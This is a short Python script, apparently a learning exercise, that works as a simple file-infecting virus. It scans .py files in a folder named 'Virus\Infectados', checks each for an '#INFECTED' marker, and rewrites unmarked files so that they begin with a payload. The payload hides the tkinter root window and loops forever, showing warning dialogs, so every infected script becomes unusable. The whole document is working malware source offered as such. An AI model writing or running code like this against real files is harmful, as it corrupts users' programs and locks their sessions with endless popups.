import glob

files = glob.glob("Otros\\Virus\\Infectados\\*.py")
print(files)
virus = """
from tkinter import *
from tkinter import messagebox
root = Tk()
root.withdraw()
while True:
    messagebox.showwarning("INFECTED", "WARNING")
"""
infected_str = "#INFECTED"
is_infected = False
for file in files:
    f = open(file, 'r')
    code = f.readlines()
    print(code)
    for line in code:
        if infected_str in line:
            is_infected = True
            break
    if not is_infected:
        new_f = open(file,'w')
        new_f.write(infected_str+'\n')
        new_f.write(virus+"\n")
        new_f.writelines(code)
        new_f.close()